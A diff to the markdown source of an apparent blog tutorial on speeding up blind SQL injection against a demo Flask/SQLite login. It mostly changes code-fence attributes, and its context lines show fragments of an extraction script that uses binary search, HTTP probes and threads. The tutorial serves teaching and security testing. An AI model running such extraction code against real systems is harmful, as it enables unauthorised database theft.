@@ -55,7 +55,7 @@ So what does this look like practically?
 Here we have a simple Flask server with an in-memory SQLite database containing a `login` endpoint. The `login()` function is simple: check if the username and password exists in the DB. If it exists, then login is successful.^[Full code for the Flask + SQLite demo is [uploaded on GitHub](https://github.com/TrebledJ/bsqli.py/blob/89e06c708d8a3be4afca6efcddff69097934d0df/demo/server.py) for reference.]
 
 
-```python
+```python {data-label=server.py data-lang-off}
 @app.route('/login', methods=['POST'])
 def login():
     username = request.form['username']
@@ -93,7 +93,7 @@ Moreover, we can leak further information by changing `1=1` to other guessy quer
 
 We can use this simple script to brute-force the remaining characters:
 
-```python
+```python {data-lang-off}
 import requests
 
 def check_sql_value(sql_query: str, idx: int, guess: int) -> bool:
@@ -136,7 +136,7 @@ This is a good thing for real life engagements: fewer iterations → less traffi
 
 Normally, binary search relies on three possible outputs for a test: `=`, `<`, and `>`. But it is possible to make do with just two possible outputs: `<` and `>=`. If it’s less, we eliminate the upper half; otherwise, we eliminate the lower half.
 
-```python
+```python {data-lang-off}
 def binary_search(val: int, low: int, high: int) -> int:
     """Binary search for value between low (inclusive) and high (exclusive),
     assuming the guessed value is within range."""
@@ -154,21 +154,21 @@ def binary_search(val: int, low: int, high: int) -> int:
 
 Here’s a quick example, where we progress towards 125 in 7 steps (which will translate to 7 HTTP requests later on).
 
-```python
->>> print('result:', binary_search(125, 0, 128))
-  0 - 128       Guess:   64
- 64 - 128       Guess:   96
- 96 - 128       Guess:  112
-112 - 128       Guess:  120
-120 - 128       Guess:  124
-124 - 128       Guess:  126
-124 - 126       Guess:  125
-result: 125
+```python {.command-line data-prompt=">>>" data-filter-output="out>" data-lang-off}
+print('result:', binary_search(125, 0, 128))
+out>  0 - 128       Guess:   64
+out> 64 - 128       Guess:   96
+out> 96 - 128       Guess:  112
+out>112 - 128       Guess:  120
+out>120 - 128       Guess:  124
+out>124 - 128       Guess:  126
+out>124 - 126       Guess:  125
+out>result: 125
 ```
 
 In the code snippets above, `val` is known for demo purposes. But in reality, `val` is unknown; it’s the data we’re trying to exfiltrate. To be more realistic, let's replace the `val` comparisons with a function `check_sql_value()` which sends network requests.
 
-```python
+```python {data-lang-off}
 def binary_search(sql_query: str, idx: int, low: int, high: int) -> int:
     """Find the value of sql_query using binary search, between
     low (inclusive) and high (exclusive). Assuming the guessed value
@@ -195,7 +195,7 @@ for idx in range(1, 256):
 
 The idea here is we can pass an SQL query, such as `@@version` or `sqlite_version()`, followed by the index and expected ranged.
 
-```python
+```python {data-lang-off}
 binary_search("@@version", idx, low, high)
 ```
 
@@ -251,7 +251,7 @@ In the code snippet below, we create a task for each character of the string. (A
 
 We can process finished tasks as they roll in using `concurrent.futures.as_completed`.
 
-```python
+```python {data-lang-off}
 with concurrent.futures.ThreadPoolExecutor(max_workers=8) as executor:
     future_map = {}
 
@@ -271,7 +271,7 @@ with concurrent.futures.ThreadPoolExecutor(max_workers=8) as executor:
 
 The length of the string can be determined beforehand with another binary search. Assuming the max length is 2048...
 
-```python
+```python {data-lang-off}
 length = get_by_bsearch(f"LENGTH(({sql}))", 0, 2048)
 ```
 
@@ -322,13 +322,13 @@ The implementation is as simple as replacing `input()` with `prompt.prompt()`.
 
 Before:
 
-```python
+```python {data-lang-off}
 sql = input("sqli> ")
 ```
 
 After:
 
-```python
+```python {data-lang-off}
 prompt = PromptSession(history=FileHistory(".history"))
 sql = prompt.prompt("sqli> ")
 ```
